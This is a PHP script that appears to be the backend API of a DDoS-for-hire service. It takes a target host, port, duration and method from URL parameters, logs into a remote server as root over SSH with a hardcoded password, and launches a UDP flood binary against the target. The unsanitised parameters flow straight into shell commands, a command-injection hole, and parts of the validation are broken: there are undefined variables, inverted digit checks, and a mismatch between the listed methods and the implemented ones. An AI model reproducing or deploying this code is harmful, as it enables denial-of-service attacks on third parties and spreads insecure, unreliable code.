<?php
ignore_user_abort(true);
set_time_limit(86100);

$servers = [
    "1.1.1.1" => "test"
];
foreach ($servers as $server => $pass) {
    $server_ip = $server; // Ip vds
    $server_pass = $pass; // Pass vds
    $server_user = "root"; // username ['Example'] = root
    $key = $_GET["key"];
    $host = $_GET["host"];
    $port = intval($_GET["port"]);
    $time = intval($_GET["time"]);
    $method = $_GET["method"];
    $array = [
        "NTP",
        "stop",
    ]; // All methods
    $ray = ["silence"]; // Api key
    if (!empty($time)) {
        if (!empty($host)) {
            if (!empty($method)) {
                if ($method == "stop") {
                    $command = "pkill $host -f";
                }
            }
        }
    }
    if (!empty($key)) {
    } else {
        die("Error: specify API key!");
    }
    if (in_array($key, $ray)) {
    } else {
        die("Error: Incorrect API key!");
    }
    if (!empty($time)) {
    } else {
        die("Error: Specify the time of the attack!");
    }
    if (!empty($host)) {
    } else {
        die("Error: specify host!");
    }
    if (!empty($method)) {
    } else {
        die("Error: specify method!");
    }
    if (in_array($method, $array)) {
    } else {
        die("Error: The method you specified does not exist!");
    }
    if ($port > 65535) {
        die("Error: A port greater than 65535 does not exist!");
    }
    if ($time > 86400) {
        die("Error: The attack can not be more than 86400 seconds!");
    }
    if (ctype_digit($Time)) {
        die("Error: the time is not in digits!");
    }
    if (ctype_digit($Port)) {
        die("Error: port is not specified in digits!");
    }
    // All methods and command
    if ($method == "UDP") {
        $command = "cd /root/methods/ && ./udp $host $port 1 -1 $time";
    }
    if (!function_exists("ssh2_connect")) {
        die("Error: SSH2 is not installed on your server!");
    }
    if (!($con = ssh2_connect($server_ip, 22))) {
        echo "Error: it looks like daddy is fucked up :D";
    } else {
        if (!ssh2_auth_password($con, $server_user, $server_pass)) {
            echo "Error: wrong login or password!";
        } else {
            if (!($stream = ssh2_exec($con, $command))) {
                echo "Error: You're server was not able to execute you're methods file and or its dependencies";
            } else {
                stream_set_blocking($stream, false);
                $data = "";
                while ($buf = fread($stream, 4096)) {
                    $data .= $buf;
                }
                echo "Success!</br>Target: $host</br>Port: $port </br>Time: $time</br>Method: $method";
                fclose($stream);
            }
        }
    }
}

?>
